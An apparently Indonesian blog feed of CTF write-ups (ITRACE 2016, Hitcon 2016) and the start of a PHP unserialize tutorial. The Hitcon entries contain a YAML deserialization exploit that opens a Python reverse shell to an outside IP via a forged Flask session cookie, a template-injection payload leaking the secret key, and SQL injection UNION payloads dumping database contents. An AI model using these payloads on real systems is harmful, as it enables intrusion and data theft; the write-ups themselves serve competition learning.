&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
import sys

def printf(c):
	sys.stdout.write(c)
	sys.stdout.flush()

f = open('0.loremipsum')
x = f.read().split(' ')

for i in range(1,63):
	k = str(i)+'.loremipsum'
	h = open(k)
	hh = h.read().split(' ')
	for u in range(len(x)):
		if x[u] == hh[u]:
			pass
		elif hh[u]!='semper':
			printf(hh[u])


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{similiriti_similikiti}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;reversing-brute-self---35-point&quot;&gt;Reversing: Brute Self - 35 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Brute Self
Point : 35
Category : #reversing
Description :
http://task-00000011.itrace.systems/password.tar.gz&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Di berikan binary ELF-64 Bit Stripped. kita analisa menggunakan IDA 
berdasarkan string yang di output dari program “Bad.”. di temukan flag di simpan di dalam array.&lt;/p&gt;

&lt;p&gt;Ketika di convert ke ascii hasilnya adalah : 
&lt;code&gt;'K' 'V' 'T' 'C' 'E' 'G' '}' 'd' '6' 'f' 'a' 'e' '2' 'f' '5' '7' 'a' 'j' '3' 'f' '3' 'p' '8' 'a' '3' 'P' 'a' 'r' '6' 'e' ''&lt;/code&gt;
Seharusnya flag di mulai dengan “ITRACE”&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Huruf K posisinya +2 dari I
Huruf V posisinya +2 dari T
...
Huruf G posisinya +2 dari E
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
a = 'K' 'V' 'T' 'C' 'E' 'G' '}' 'd' '6' 'f' 'a' 'e' '2' 'f' '5' '7' 'a' 'j' '3' 'f' '3' 'p' '8' 'a' '3' 'P' 'a' 'r' '6' 'e' ''
flag = &quot;&quot;
for x in a:
	flag += chr(ord(x)-2)
	pass

print flag

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Semua ascii di kurang 2 dan di temukan flagnya : &lt;code&gt;ITRACE{b4d_c0d35_h1d1n6_1N_p4ck}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;website-square-them---60-point&quot;&gt;Website: Square Them - 60 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Square Them
Point : 60
Category : #web #ppc
Description :
http://task-00000010.itrace.systems/square.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;di task ini kita harus bikin square yang kalau di jumlah rows dan cols nya itu sama.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;2	9	4   -&amp;gt; 15
7	5	3   -&amp;gt; 15
6	1	8   -&amp;gt; 15
-   -   -
15  15  15


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;jika sudah dapat susunan yang benar kirim melalui 
&lt;code&gt;POST numbers=2,9,4,7,5,3,6,1,8&lt;/code&gt; ke websitenya , jika question 1 benar maka akan lanjut ke question 2 
sampai 10 dan di dapatkan flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
import mechanize
from BeautifulSoup import BeautifulSoup
import urllib,requests
import json

def createSquare(x):
	grid = [[0,0,0],[0,0,0],[0,0,0]]
	x = int(x)
	grid[1][1] = x/3
	grid[2][0] = grid[1][1]+1
	grid[0][2] = grid[1][1]-1

	grid[0][0] = grid[1][1]-3
	grid[1][2] = grid[1][1]-2
	grid[2][1] = grid[1][1]-4

	grid[0][1] = x - (grid[0][0] + grid[0][2])
	grid[1][0] = x - (grid[1][1] + grid[1][2])
	grid[2][2] = x - (grid[2][0] + grid[2][1])

	return grid


br = mechanize.Browser()
url = 'http://task-00000010.itrace.systems/square.php'
content = br.open_novisit(url).read()
soup = BeautifulSoup(content)
soal = soup.find('span').next


count = 0
while count &amp;lt;= 10:
	res = &quot;&quot;
	square = createSquare(soal)
	for x in square:
		for val in x:
			res += str(val) + ','

	res = res[:len(res)-1]



	print &quot;[Recv] : &quot; + str(soal)
	print &quot;[Send] : &quot; + res


	params = {'numbers': res}
	data = urllib.urlencode(params)
	res = br.open(url,data).read()
	print &quot;[Recv]&quot; + res 
	res = json.loads(res)
	soal = res['nextsum']

	count += 1

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{m4g1c_squ4r3_is_s0_m4th}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;forensic-binary-typ0---45-point&quot;&gt;Forensic: Binary Typ0 - 45 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Binary Typ0
Point : 45
Category : #forensic
Description :
http://task-00000101.itrace.systems/raws.pcapng&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Di berikan rekaman jaringan format &lt;code&gt;pcapng&lt;/code&gt;, setelah di analisa di temukan
deretan hexadecimal yang terpisah menjadi beberapa bagian yang di duga adalah gambar
karena ada header magic &lt;code&gt;FF D8 FF E0&lt;/code&gt; tapi ada karakter yang bukan hexadecimal dan ada yang 1 karakter.&lt;/p&gt;

&lt;p&gt;kita gunakan script python untuk membersihkan hexadecimal tersebut.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
import sys,re,binascii


def printf(c):
    sys.stdout.write(c)
    sys.stdout.flush()

pattern = re.compile(&quot;[0-9a-fA-F]{2}&quot;)
res = &quot;&quot;
for i in range(1,11):
    k = str(i)
    h = open(k)
    hh = h.read().split(' ')
    for u in range(len(hh)):
            if pattern.match(hh[u]) and len(hh[u]) == 2:
                res += hh[u]
            elif len(hh[u]) == 1 :
                 fix = &quot;0&quot;+hh[u]
                 if pattern.match(fix):
                    res += fix

text_file = open(&quot;hexm&quot;, &quot;w&quot;)
text_file.write(res)
text_file.close()

with open('hexm') as f, open('test.jpg', 'wb') as fout:
    for line in f:
        fout.write(
            binascii.unhexlify(''.join(line.split()))
        )

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{FROM.0-F}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recon-ping-me---501-point&quot;&gt;Recon: Ping Me - 50.1 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Ping Me
Point : 50.1
Category : #recon
Description :
Ping Me. Literally.
Hint: are mine&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hasil googling di temukan &lt;code&gt;http://cafelinux.info/pingme&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{http_www.cafelinux.info_ping.me}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;recon-copy-pasta---1002-point&quot;&gt;Recon: Copy Pasta - 100.2 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Copy Pasta
Point : 100.2
Category : #recon
Description :
Hints: 
-actually-heartbeat-opposite
-Pastebin deep internet version&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;inurl:pasta&lt;/li&gt;
    &lt;li&gt;The hints, is just an ordinary text. Not that technicall&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;WARNING: Please use TOR Browser while diving in Deep Web&lt;/p&gt;

&lt;p&gt;Di hidden wiki kita cari search engine untuk mencari copy pasta
kemudian kita coba cari di &lt;code&gt;ahmia&lt;/code&gt; search &lt;code&gt;pasta&lt;/code&gt; dan di temukan text hosting mirip pastebin
dan jika kita buat paste maka akan muncul kata2 random jadi url nya, dan clue nya adalah &lt;code&gt;actually-heartbeat-opposite&lt;/code&gt;
seperti kata random yang di generate ketika membuat raw.&lt;/p&gt;

&lt;p&gt;akses ke url nya dengan actually-heartbeat-opposite maka akan mendapatkan flag di address bar.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ppc-pixel-racist--70-point&quot;&gt;PPC: Pixel Racist = 70 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Pixel Racist
Point : 70
Category : #ppc
Description :
http://task-00001001.itrace.systems/racist.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;mencari pixel yang paling sedikit di gunakan dalam gambar kemudian mengirimkannya sebagai jawaban
ke server, setelah 10 stage di dapatkan flag.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from PIL import Image
import urllib
import urllib2
from collections import defaultdict
from mechanize import Browser

br = Browser()
url = &quot;http://task-00001001.itrace.systems/image.php&quot;
url2 = &quot;http://task-00001001.itrace.systems/racist.php&quot;
br.open(url2)

while 1:
	im = Image.open(br.open_novisit(url))
	by_color = defaultdict(int)
	for pixel in im.getdata():
	    by_color[pixel] += 1
	    
	res = &quot;&quot;
	curr = 9999999999
	for x,y in by_color.items():
	    if curr&amp;gt;y:
	        curr = y
	        res = x
	res = &quot;%02x%02x%02x&quot; % res
	pasam = {'color': res}
	data = urllib.urlencode(pasam)
	daa = br.open(url2,data)
	c = daa.read()
	if &quot;flag:&quot; in c:
		print c
		break

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{y0u_6uy5_4r3_4wes0m3}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ppc-scazzy---88-point&quot;&gt;PPC: Scazzy - 88 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Scazzy
Point : 88
Category : #ppc
Description :
Scazzy, bot berjenis kelamin perempuan. Suka menggoda. Tapi kalo dirayu jual mahal. https://web.telegram.org/#/im?p=@itrace&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;untuk menjawab pertanyaan bot telegram ini kita perlu melakukan decode terhadap pesannya dan kemudian calculate
dan kirim jawabannya, tapi di saya solve dengan setengah manual tapi dengan bantuan python.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# -*- coding: utf-8 -*-

import re


def decc(data):
	pattern = re.compile(&quot;0[xX][0-9a-fA-F]+&quot;)
	pattern2 = re.compile(&quot;[0-1]{8}&quot;)

	if pattern.match(data) :
		#decode hex
		data = int(data,16)
		return data
	elif pattern2.match(data):
		#decode binary
		data = int('0b'+data,2)
		return data	


pattern = re.compile(&quot;0[xX][0-9a-fA-F]+&quot;)
pattern2 = re.compile(&quot;[0-1]{8}&quot;)

soal = raw_input()
soal = soal.split(&quot; &quot;)

num = list()
opp = list()
x1=0
x2=0
mas = &quot;&quot;
for k in soal:
	if pattern.match(k):
		num.append(decc(k))
		mas += str(decc(k))
		x1+=1
	elif pattern2.match(k):
		num.append(decc(k))
		mas += str(decc(k))
		x1+=1

	elif k == &quot;add&quot; or k == &quot;x&quot; or k == &quot;+&quot; or k == &quot;-&quot; or k == &quot;/&quot; or k == &quot;\xc3\xb7&quot;:
		if k == &quot;add&quot;:
			k = &quot;+&quot;
		elif k == &quot;x&quot;:
			k = &quot;*&quot;
		elif k == &quot;\xc3\xb7&quot;:
			k = &quot;/&quot;

		opp.append(k)
		mas += k
		x2+=1

print mas



res = eval(str(mas))
print &quot;/answer&quot; , res


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;setelah 20 stage menjawab pertanyaan di dapatkan flag
Flag : &lt;code&gt;Congratulations. This is your flag: ITRACE{b0t_tele6r4m_i5_m0d3rn_typ3_0f_ircs_b0t}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;misc--print-the-flag---21-point&quot;&gt;Misc : Print The Flag - 21 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Print The Flag
Point : 21
Category : #misc
Description :
Download PrintTheFlag.class and reupload to http://45.64.99.71:5555/upload.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;di berikan file PrintTheFlag.class yang header nya corrupt. kita fix headernya dengan &lt;code&gt;hexedit&lt;/code&gt;
ke &lt;code&gt;CA FE BA BE&lt;/code&gt; dan upload ke website &lt;code&gt;http://45.64.99.71:5555/upload.php&lt;/code&gt; untuk di jalankan 
dan di dapatkan flagnya&lt;/p&gt;

&lt;p&gt;Flag : &lt;code&gt;ITRACE{s0m3t1m35_j4v4_is_s0_t3xty&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;trivia-ternate-maluku-utara-indonesia-timur---10-point&quot;&gt;Trivia: Ternate Maluku Utara Indonesia Timur - 10 Point&lt;/h2&gt;
&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;Title : Ternate Maluku Utara Indonesia Timur
Point : 10
Category : #trivia
Description :
https://goo.gl/forms/c0bKCOYi3CUJXtMh2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Isi survey dan di dapat flag.&lt;/p&gt;


  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/itrace-2016-level3-writeup&quot;&gt;ITRACE 2016 Level 3: Writeups&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on October 10, 2016.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Hitcon 2016 : Secure Post]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/hitcon-secure-post"/>
  <id>http://localhost:4000/web%20exploitation/hitcon-secure-post</id>
  <published>2016-10-10T00:00:00+07:00</published>
  <updated>2016-10-10T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#Hitcon%202016" term="Hitcon 2016" />
  
  
  <content type="html">
  
    &lt;h3 id=&quot;problem-&quot;&gt;Problem :&lt;/h3&gt;

&lt;p&gt;Here is a service that you can store any posts. Can you hack it?
http://52.198.91.29/&lt;/p&gt;

&lt;h3 id=&quot;solution-&quot;&gt;Solution :&lt;/h3&gt;

&lt;p&gt;Di berikan web service dengan flask. dan kita bisa mengakses source code nya di &lt;code&gt;http://52.198.91.29/source&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
from flask import Flask
import config

# init app
app = Flask(__name__)
app.secret_key = config.flag1
accept_datatype = ['json', 'yaml']

from flask import Response
from flask import request, session
from flask import redirect, url_for, safe_join, abort
from flask import render_template_string

# load utils
def load_eval(data):
    return eval(data)

def load_pickle(data):
    import pickle
    return pickle.loads(data)

def load_json(data):
    import json
    return json.loads(data)

def load_yaml(data):
    import yaml
    return yaml.load(data)

# dump utils
def dump_eval(data):
    return repr(data)

def dump_pickle(data):
    import pickle
    return pickle.dumps(data)

def dump_json(data):
    import json
    return json.dumps(data)

def dump_yaml(data):
    import yaml
    return yaml.dump(data)


def render_template(filename, **args):
    with open(safe_join(app.template_folder, filename)) as f:
        template = f.read()
    name = session.get('name', 'anonymous')[:10]
    return render_template_string(template.format(name=name), **args)

def load_posts():
    handlers = {
        # disabled insecure data type
        #&quot;eval&quot;: load_eval,
        #&quot;pickle&quot;: load_pickle,

        &quot;json&quot;: load_json,
        &quot;yaml&quot;: load_yaml
    }

    datatype = session.get(&quot;post_type&quot;, config.default_datatype)
    data = session.get(&quot;post_data&quot;, config.default_data)

    if datatype not in handlers: abort(403)
    return handlers[datatype](data)

def store_posts(posts, datatype):
    handlers = {
        &quot;eval&quot;: dump_eval,
        &quot;pickle&quot;: dump_pickle,

        &quot;json&quot;: dump_json,
        &quot;yaml&quot;: dump_yaml
    }
    if datatype not in handlers: abort(403)
    data = handlers[datatype](posts)

    session[&quot;post_type&quot;] = datatype
    session[&quot;post_data&quot;] = data


@app.route('/')
def index():
    posts = load_posts()
    return render_template('index.html', posts = posts, accept_datatype = accept_datatype)

@app.route('/post', methods=['POST'])
def add_post():
    posts = load_posts()

    title = request.form.get('title', 'empty')
    content = request.form.get('content', 'empty')
    datatype = request.form.get('datatype', 'json')
    if datatype not in accept_datatype: abort(403)
    name = request.form.get('author', 'anonymous')[:10]

    from datetime import datetime
    posts.append({
        'title': title,
        'author': name,
        'content': content,
        'date': datetime.now().strftime(&quot;%B %d, %Y %X&quot;)
    })
    session[&quot;name&quot;] = name
    store_posts(posts, datatype)
    return redirect(url_for('index'))

@app.route('/source')
def get_source():
    with open(__file__, &quot;r&quot;) as f:
        resp = f.read()
    return Response(resp, mimetype=&quot;text/plain&quot;)

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;secure-post&quot;&gt;Secure Post&lt;/h3&gt;

&lt;p&gt;pada fungsi &lt;code&gt;add_post&lt;/code&gt; terlihat bahwa author name yang kita input akan di simpan ke dalam session.
&lt;code&gt;session[&quot;name&quot;] = name&lt;/code&gt; dan pada fungsi &lt;code&gt;render_template&lt;/code&gt; session kita di ambil 10 karakter pertamanya
&lt;code&gt;name = session.get('name', 'anonymous')[:10]&lt;/code&gt;. kemungkinan kita bisa melakukan template string injection.&lt;/p&gt;

&lt;p&gt;namun kita tidak bisa menggunakan payload yang lebih dari 10 karakter awalnya kita coba 
“{{config.items()}} “ tapi tidak menghasilkan apa karena &amp;gt; 10 karakter. dan setelah beberapa lama akhirnya di temukan flag dengan “{{config}}”
pas 10 karakter.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;p class=&quot;lead blog-description&quot;&amp;gt;&amp;lt;Config {'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_PATH': None, 'TRAP_HTTP_EXCEPTIONS': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_DOMAIN': None, 'USE_X_SENDFILE': False, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': 43200, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_HTTPONLY': True, 'SERVER_NAME': None, 'APPLICATION_ROOT': None, 'DEBUG': False, 'JSON_AS_ASCII': True, 'TESTING': False, 'JSONIFY_PRETTYPRINT_REGULAR': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'JSON_SORT_KEYS': True, 'LOGGER_NAME': 'post_manager', 'PREFERRED_URL_SCHEME': 'http', 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'hitcon{&amp;gt;_&amp;lt;---Do-you-know-&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;-is-very-fun?}', 'TRAP_BAD_REQUEST_ERRORS': False}&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;secure-post-2&quot;&gt;Secure Post 2&lt;/h3&gt;

&lt;p&gt;ada 2 fungsi yang menarik &lt;code&gt;store_posts&lt;/code&gt; dan &lt;code&gt;load_posts&lt;/code&gt; awalnya saya kira &lt;code&gt;eval&lt;/code&gt; dan &lt;code&gt;pickle&lt;/code&gt; 
bisa di manfaatkan dalam hal ini untuk membantu melakukan RCE. tapi setelah di lihat lagi kodenya 
memiliki beberapa checking yang sangat strict terhadap &lt;code&gt;eval&lt;/code&gt; dan &lt;code&gt;pickle&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;pengecekan di sini &lt;code&gt;accept_datatype = ['json', 'yaml']&lt;/code&gt; dan &lt;code&gt;load_posts&lt;/code&gt; di comments
dan beberapa handlers seperti ini &lt;code&gt;if datatype not in handlers: abort(403)&lt;/code&gt;
sehingga kita mustahil untuk memanfaatkan itu.&lt;/p&gt;

&lt;p&gt;ternyata &lt;code&gt;YAML&lt;/code&gt; sifatnya pun sama dengan pickle ketika melakukan unserialize
tapi untuk melakukan injeksi kita tidak bisa langsung melakukan via &lt;code&gt;add_post&lt;/code&gt;
kita injeksi langsung ke dalam session flask tersebut. di website nya juga ada 
pesan &lt;code&gt;Data is not stored in database&lt;/code&gt;. jadi post kita di simpan di dalam session Flask&lt;/p&gt;

&lt;p&gt;tapi flask itu melakukan signed sama cookie nya jadi kita ngak bisa 
langsung rubah. untuk itu saya simulasikan dengan &lt;code&gt;secret_key&lt;/code&gt; yang sama
untuk generate cookie payload yang kita inginkan&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
class Exploit(object):
 def __reduce__(self):
   fd = 1
   return (exec,
           ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;128.199.226.218&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);',))
   

# dump utils
@app.route('/')
def index():
    anu = yaml.dump(Exploit())
    serializer_interface = SecureCookieSessionInterface()
    serializer = serializer_interface.get_signing_serializer(app)
    out = serializer.dumps({
    &quot;name&quot;: &quot;shit&quot;,
    &quot;post_data&quot;: &quot;- &quot;+anu,
    &quot;post_type&quot;: &quot;yaml&quot;
})

    print(out)
    return render_template('index.html', out=out)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;kemudian kita injeksikan session payload ke web tersebut. sebelumnya
kita nyalakan listening pada server kita misalnya port: 4444 seperti
dalam exploit di atas.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/6khdwmh6c607znru18kahziij&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/6khdwmh6c607znru18kahziij.png&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Flag : &lt;code&gt;hitcon{unseriliaze_is_dangerous_but_RCE_is_fun!!}&lt;/code&gt;&lt;/p&gt;

  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/hitcon-secure-post&quot;&gt;Hitcon 2016 : Secure Post&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on October 10, 2016.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[Hitcon 2016 : Are you rich]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/hitcon-are-you-rich"/>
  <id>http://localhost:4000/web%20exploitation/hitcon-are-you-rich</id>
  <published>2016-10-10T00:00:00+07:00</published>
  <updated>2016-10-10T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#Hitcon%202016" term="Hitcon 2016" />
  
  
  <content type="html">
  
    &lt;h3 id=&quot;problem-&quot;&gt;Problem :&lt;/h3&gt;

&lt;p&gt;Are you rich? Buy the flag!
http://52.197.184.164/are_you_rich/&lt;/p&gt;

&lt;p&gt;ps. You should NOT pay anything for this challenge&lt;/p&gt;

&lt;p&gt;Some error messages which is non-related to challenge have been removed&lt;/p&gt;

&lt;h3 id=&quot;solution-&quot;&gt;Solution :&lt;/h3&gt;

&lt;p&gt;Kita dapat web di mana kita bisa lakukan generate bitcion address dan membeli flag. 
Untuk membeli flag kita harus mempunyai 5 BTC dalah address tersebut (Seharusnya),
Dan jika kita menggunakan Address BTC(&amp;gt;=26 karakter) yang bukan di generate dari web tersebut
maka akan muncul error &lt;code&gt;This address not issued by us&lt;/code&gt; dan ketika kita menambah kan kutip 
pada address BTC nya maka akan muncul &lt;code&gt;Error when searching in the issue log&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Dari situ kita asumsikan bahwa address BTC yang sudah di generate itu di simpan ke database
dan kemudian di cari lagi ketika kita akan membeli flag.&lt;/p&gt;

&lt;p&gt;Ternyata memang SQL injection&lt;/p&gt;

&lt;p&gt;Input : &lt;code&gt;1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select @@version) limit 1,2#&lt;/code&gt;
Error : &lt;code&gt;Error!: Remote API server reject your invalid address '5.7.15-0ubuntu0.16.04.1'. If your address is valid, please PM @cebrusfs or other admin on IRC.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Input : &lt;code&gt;1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select table_name from information_schema.tables where table_schema != 'information_schema' limit 1) limit 1,2#&lt;/code&gt;
Error : &lt;code&gt;Error!: Remote API server reject your invalid address 'flag1'. If your address is valid, please PM @cebrusfs or other admin on IRC.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Input : &lt;code&gt;1uQfX9XbdGu2Qr26cB1PZP4Pp8xZaRMfz' UNION SELECT (select flag from flag1 limit 1) limit 1,2#&lt;/code&gt;
Error : &lt;code&gt;Error!: Remote API server reject your invalid address 'hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}'. If your address is valid, please PM @cebrusfs or other admin on IRC.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Dan di dapatkan flag nya &lt;code&gt;hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}&lt;/code&gt; , sayangnya kita tidak temukan flag Are you rich 2 :(&lt;/p&gt;


  
  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/web%20exploitation/hitcon-are-you-rich&quot;&gt;Hitcon 2016 : Are you rich&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on October 10, 2016.&lt;/p&gt;</content>
</entry>



<entry>
  <title type="html"><![CDATA[PHP Object Injection Via Unserialize]]></title>
  <link rel="alternate" type="text/html" href="http://localhost:4000/web%20exploitation/php-object-injection"/>
  <id>http://localhost:4000/web%20exploitation/php-object-injection</id>
  <published>2016-10-01T00:00:00+07:00</published>
  <updated>2016-10-01T00:00:00-00:00</updated>
  
  <author>
    <name>Abdillah Muhamad</name>
    <uri>http://localhost:4000</uri>
    <email>hasny1337@gmail.com</email>
  </author>
  
  
  <category scheme="http://localhost:4000/tags/#Web%20Exploitation" term="Web Exploitation" />
  
  
  <content type="html">
  
    &lt;p&gt;PHP Unserialize bisa menjadi petaka ketika kita mengambil atau menggunakan input
dari user untuk di eksekusi ke unserialize(), dalam dokumentasi fungsi &lt;a href=&quot;http://php.net/manual/en/function.unserialize.php&quot;&gt;unserialize()&lt;/a&gt; di php.net
kita sudah di beri warning untuk tidak menggunakan input dari user karena bisa
berdampak code execution pada saat object insantiation atau autoloading, untuk keamanan
kita bisa menggunakan &lt;a href=&quot;http://php.net/manual/en/function.json-decode.php&quot;&gt;json_encode()&lt;/a&gt; atau &lt;a href=&quot;http://php.net/manual/en/function.json-encode.php&quot;&gt;json_decode()&lt;/a&gt; sebagai standar pertukaran data.&lt;/p&gt;

&lt;p&gt;Sebelum melanjut ke tahap melakukan exploitasi pada kasus yang vulnerable mari kita pahami
apa yang di lakukan oleh fungsi &lt;a href=&quot;http://php.net/manual/en/function.serialize.php&quot;&gt;serialize()&lt;/a&gt; dan &lt;a href=&quot;http://php.net/manual/en/function.unserialize.php&quot;&gt;unserialize()&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;serialize&quot;&gt;Serialize&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;string serialize ( mixed $value )&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://php.net/manual/en/function.serialize.php&quot;&gt;serialize()&lt;/a&gt; menerima input satu parameter yaitu
value yang ingin di serialize dalam bentuk apapun kecuali &lt;a href=&quot;http://php.net/manual/en/language.types.resource.php&quot;&gt;resource&lt;/a&gt;-type
Return value yang di kembalikan adalah byte-stream representasi dari value.&lt;/p&gt;

&lt;h4 id=&quot;contoh&quot;&gt;Contoh&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
$myArr = array(&quot;PHP&quot;,&quot;IS&quot;,&quot;NICE&quot;);
$serialized = serialize($myArr);
print $serialized;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Output : &lt;code&gt;a:3{i:0;s:3:&quot;PHP&quot;;i:1;s:2:&quot;IS&quot;;i:2;s:4:&quot;NICE&quot;;}&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;a:3{&lt;/code&gt;          : Array dari 3 value&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;i:0;&lt;/code&gt;          : Integer, Index ke [0]&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;s:3:&quot;PHP&quot;&lt;/code&gt;     : String, 3 karakter, Value “PHP”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;i:1;&lt;/code&gt;          : Integer, Index ke [1]&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;s:2:&quot;IS&quot;&lt;/code&gt;      : String, 2 karakter, Value “IS”&lt;/li&gt;
